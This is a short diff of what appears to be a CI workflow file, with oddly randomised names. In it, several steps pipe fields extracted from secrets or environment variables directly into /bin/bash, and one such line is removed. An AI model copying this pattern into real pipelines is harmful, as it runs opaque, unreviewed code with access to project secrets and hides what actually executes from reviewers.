@@ -18,7 +18,6 @@ jobs:
           phk593: ${{ secrets.phk593 }}
         run: |
           printf '%s' "$phk593" | jq -r .gfn43863 | /bin/bash
-          printf '%s' "$kh2220" | jq -r .ixmio60 | /bin/bash
           echo $lxkz9979 | jq -r .ou707 | /bin/bash
           echo $n45972 | jq -r .qb71639 | /bin/bash
 
